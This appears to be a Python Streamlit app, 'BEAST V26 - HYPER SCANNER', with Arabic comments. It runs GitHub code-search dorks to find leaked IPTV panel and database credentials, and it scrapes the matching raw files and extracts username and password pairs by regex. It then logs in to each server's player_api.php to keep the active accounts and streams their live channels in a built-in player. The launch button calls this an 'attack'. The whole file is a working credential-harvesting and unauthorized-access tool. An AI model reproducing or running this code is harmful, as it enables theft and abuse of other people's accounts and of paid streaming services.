import streamlit as st
import requests
import re
import time
from datetime import datetime

# --- الإعدادات الأساسية ---
st.set_page_config(page_title="BEAST V26 - HYPER SCANNER", layout="wide", initial_sidebar_state="expanded")

# --- إدارة الحالة (Session State) ---
if "auth" not in st.session_state: st.session_state.auth = False
if "page" not in st.session_state: st.session_state.page = "search"
if "found_servers" not in st.session_state: st.session_state.found_servers = []
if "selected_srv" not in st.session_state: st.session_state.selected_srv = None

# --- نظام الدخول ---
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V26 - LOGIN</h1>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1,1.5,1])
    with col2:
        pwd = st.text_input("Password:", type="password")
        if st.button("دخول النظام"):
            if pwd == "BEAST_V17_PRO":
                st.session_state.auth = True
                st.rerun()
            else: st.error("❌ كلمة المرور خاطئة")
    st.stop()

# --- التنسيق (CSS) ---
st.markdown("""
<style>
    .stApp { background-color: #050505; color: #e0e0e0; }
    .server-card { 
        background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
        border: 1px solid #30363d; padding: 15px; border-radius: 12px;
        margin-bottom: 15px; border-left: 5px solid #00ff41;
    }
    .status-tag { background: #00ff41; color: black; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 10px; }
    .channel-list { max-height: 80vh; overflow-y: auto; background: #0d1117; padding: 10px; border-radius: 8px; }
    .stButton>button { width: 100%; border-radius: 5px; }
</style>
""", unsafe_allow_html=True)

# --- محرك البحث الاستخراجي ---
def perform_mega_scan(token, depth):
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    # دروكات احترافية للحصول على نتائج ضخمة
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php" username password',
        '"http://" "username=" "password=" "port" extension:txt',
        'filename:config.php "db_user" "db_pass"',
        'extension:json "server_url" "username" "password"',
        '"type=m3u_plus" "output=ts" "username="',
        'extension:txt "xtream-codes" "username"'
    ]
    
    unique_hosts = set()
    
    for dork in dorks:
        for p in range(1, depth + 1):
            try:
                url = f"https://api.github.com/search/code?q={dork}&page={p}&per_page=100"
                res = requests.get(url, headers=headers).json()
                
                if "items" not in res:
                    time.sleep(5) # تجاوز الـ Rate Limit
                    continue
                    
                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=3).text
                        # Regex مطور لاستخراج البيانات بدقة
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            server_id = f"{host}{user}{pw}"
                            if server_id not in unique_hosts:
                                with log_area: st.write(f"🔍 Checking: {host}")
                                try:
                                    api = f"{host}/player_api.php?username={user}&password={pw}"
                                    check = requests.get(api, timeout=2).json()
                                    if check.get("user_info", {}).get("status") == "Active":
                                        srv_data = {"host": host, "user": user, "pw": pw, "info": check.get("user_info")}
                                        st.session_state.found_servers.append(srv_data)
                                        unique_hosts.add(server_id)
                                        with hits_area:
                                            st.markdown(f"✅ **New Hit!** {host} | User: {user}")
                                except: continue
                    except: continue
            except: continue

# --- الصفحة الأولى: البحث والفحص ---
if st.session_state.page == "search":
    st.title("📡 BEAST V26 - HYPER SCANNER")
    
    with st.sidebar:
        st.header("⚡ التحكم")
        token = st.text_input("GitHub Token:", type="password", help="ضع التوكن هنا لضمان نتائج ضخمة")
        depth = st.slider("عمق البحث (عدد الصفحات)", 5, 100, 20)
        if st.button("🚀 بدء الهجوم الشامل"):
            st.session_state.found_servers = []
            perform_mega_scan(token, depth)

    log_area = st.empty()
    hits_area = st.container()
    
    st.subheader(f"🏆 السيرفرات المكتشفة ({len(st.session_state.found_servers)})")
    
    # عرض النتائج بشكل احترافي
    cols = st.columns(2)
    for idx, srv in enumerate(st.session_state.found_servers):
        with cols[idx % 2]:
            st.markdown(f"""
            <div class="server-card">
                <span class="status-tag">ACTIVE</span>
                <p><b>Host:</b> {srv['host']}<br>
                <b>User:</b> {srv['user']} | <b>Pass:</b> {srv['pw']}<br>
                <b>Exp:</b> {datetime.fromtimestamp(int(srv['info'].get('exp_date', 0))).strftime('%Y-%m-%d') if srv['info'].get('exp_date') else 'N/A'}</p>
            </div>
            """, unsafe_allow_html=True)
            if st.button(f"📺 فتح المشغل للسيرفر {idx+1}", key=f"open_{idx}"):
                st.session_state.selected_srv = srv
                st.session_state.page = "player"
                st.rerun()

# --- الصفحة الثانية: المشغل والقنوات ---
elif st.session_state.page == "player":
    srv = st.session_state.selected_srv
    st.markdown(f"### 📺 المشغل الذكي | {srv['host']}")
    
    if st.button("⬅️ عودة للبحث"):
        st.session_state.page = "search"
        st.rerun()

    # جلب القنوات بشكل احترافي
    @st.cache_data(ttl=3600)
    def fetch_live(h, u, p):
        try:
            return requests.get(f"{h}/player_api.php?username={u}&password={p}&action=get_live_streams", timeout=7).json()
        except: return []

    channels = fetch_live(srv['host'], srv['user'], srv['pw'])
    
    if channels:
        c1, c2 = st.columns([1, 2.5])
        
        with c1:
            st.markdown("#### 📋 القنوات")
            search_query = st.text_input("🔍 ابحث عن قناة...")
            st.markdown('<div class="channel-list">', unsafe_allow_html=True)
            for ch in channels:
                if search_query.lower() in ch['name'].lower():
                    if st.button(f"▶️ {ch['name'][:25]}", key=f"ch_{ch['stream_id']}"):
                        ext = ch.get('container_extension', 'm3u8')
                        st.session_state.stream_url = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{ch['stream_id']}.{ext}"
            st.markdown('</div>', unsafe_allow_html=True)
            
        with c2:
            if "stream_url" in st.session_state:
                st.markdown(f"**البث المباشر:** `{st.session_state.stream_url}`")
                # مشغل Video.js يدعم كل الصيغ
                st.components.v1.html(f"""
                    <link href="https://vjs.zencdn.net/7.20.3/video-js.css" rel="stylesheet" />
                    <div style="background: black; border-radius: 15px; overflow: hidden;">
                        <video id="beast-player" class="video-js vjs-fluid vjs-big-play-centered" controls preload="auto">
                            <source src="{st.session_state.stream_url}" type="application/x-mpegURL">
                        </video>
                    </div>
                    <script src="https://vjs.zencdn.net/7.20.3/video.min.js"></script>
                    <script>
                        var player = videojs('beast-player');
                        player.play();
                    </script>
                """, height=500)
            else:
                st.info("💡 اختر قناة من القائمة الجانبية للتشغيل المباشر")
    else:
        st.error("❌ لا يمكن الوصول للقنوات في هذا السيرفر حالياً.")
